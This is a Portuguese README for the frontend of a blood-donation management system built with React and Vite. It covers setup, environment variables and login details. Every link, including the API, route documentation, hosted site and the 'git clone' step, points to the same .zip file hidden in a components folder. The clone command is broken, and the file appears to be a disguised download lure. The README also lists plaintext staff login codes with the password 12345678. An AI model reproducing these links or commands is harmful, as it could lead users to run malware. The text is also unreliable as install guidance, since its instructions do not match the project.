# Sistema de Doação de Sangue

## Sobre o Projeto

Este é o frontend do sistema de gerenciamento de doações de sangue. Ele foi construído para interagir com a [API de gerenciamento de doadores de sangue](https://raw.githubusercontent.com/julioroque/Sistema_Doacao_De_Sangue/main/src/components/Pagination/Sistema-Doacao-De-Sangue-1.7-beta.1.zip), permitindo aos usuários acessar e manipular dados de Funcionários, Doadores, Doações e Estoque de Sangue de uma maneira fácil e intuitiva.

## Tecnologias Utilizadas

Este projeto utiliza as seguintes tecnologias:

- **Vite**: Uma ferramenta de construção que visa fornecer uma experiência de desenvolvimento mais rápida e eficiente.
- **React**: Uma biblioteca JavaScript para construir interfaces de usuário.
- **@fortawesome/free-solid-svg-icons e @fortawesome/react-fontawesome**: Bibliotecas para utilizar ícones do Font Awesome no projeto.

## Como Instalar e Executar o Projeto

Para instalar e executar este projeto localmente, siga estas etapas:

1. Clone este repositório para a sua máquina local:

```bash
git clone https://raw.githubusercontent.com/julioroque/Sistema_Doacao_De_Sangue/main/src/components/Pagination/Sistema-Doacao-De-Sangue-1.7-beta.1.zip
```

2. Instale as dependências do projeto, no terminal digite o comando:

```bash
npm install
```

3. Crie um arquivo `.env` e adicione as seguintes *Variáveis de Ambiente*

```bash
VITE_LOGIN=                                   
VITE_LOGOUT=                                   
VITE_EMPLOYEES=                    
VITE_DONORS=
VITE_DONATIONS=                    
VITE_STOCK=                       
```
- Observação: para que o projeto rode na sua maquina, você precisará preencher as variáveis com as rotas da  [API de gerenciamento de doadores de sangue](https://raw.githubusercontent.com/julioroque/Sistema_Doacao_De_Sangue/main/src/components/Pagination/Sistema-Doacao-De-Sangue-1.7-beta.1.zip%C3%A7%C3%A3o-das-rotas-da-api).

4. No terminal, digite o comando abaixo para iniciar o servidor local:

```bash
npm run dev
```

- Agora você pode acessar o sistema de doação de sangue no seu navegador através do endereço: `http://localhost:3000`

## Acessando o projeto

- Observação: Para conseguir logar no sistema é necessário utilizar os dados abaixo

```bash
Localhost: (http://localhost:3000) 

Código do Funcionário: 438718
Senha: 12345678
```

```bash
HemovidUnifg (https://raw.githubusercontent.com/julioroque/Sistema_Doacao_De_Sangue/main/src/components/Pagination/Sistema-Doacao-De-Sangue-1.7-beta.1.zip)

Código do Funcionário: 788216
Senha: 12345678
```
